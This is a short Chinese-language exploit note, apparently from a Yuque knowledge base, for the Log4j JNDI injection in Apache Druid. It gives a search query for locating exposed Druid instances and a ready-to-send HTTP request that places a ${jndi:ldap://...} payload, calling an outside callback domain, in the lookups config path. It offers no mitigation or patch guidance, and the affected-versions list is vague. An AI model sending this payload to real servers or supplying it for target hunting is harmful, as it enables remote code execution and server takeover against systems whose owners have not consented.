# Apace Druid存在Log4j 远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">Apache Druid是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（"OLAP"查询)。Druid最常被当做数据库来用以支持实时摄取、高性能查询和高稳定运行的应用场景，同时，Druid也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端API，Druid最适合应用于面向事件类型的数据。Log4j是Apache的一个开源项目，该漏洞产生的原因在于Log4j在记录日志的过程中会对日志内容进行判断，如果内容中包含了${，则Log4j会认为此字符属于JNDI远程加载类的地址。Apache Druid 使用了该项目进行记录日志，攻击者通过构造恶意的代码即可利用该漏洞，从而导致服务器权限丢失</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ Apache Druid

# 三、资产测绘
```java
title="Apache Druid"
```

![1718117306587-20ca98cb-dc58-4025-8a8b-2a7a2a1ee289.png](./img/x80mTfAxrWUUsm3N/1718117306587-20ca98cb-dc58-4025-8a8b-2a7a2a1ee289-632900.png)

# 四、漏洞复现
```java
GET /druid/coordinator/v1/lookups/config/${jndi:ldap://pvibhhxnwt.dgrh3.cn} HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
Content-Length: 995
Connection: close
```

![1718118782988-83dafd63-a369-410f-9799-f0866733f9f1.png](./img/x80mTfAxrWUUsm3N/1718118782988-83dafd63-a369-410f-9799-f0866733f9f1-055296.png)



> 更新: 2024-06-17 09:22:47  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ua1fln02hehbuf7g>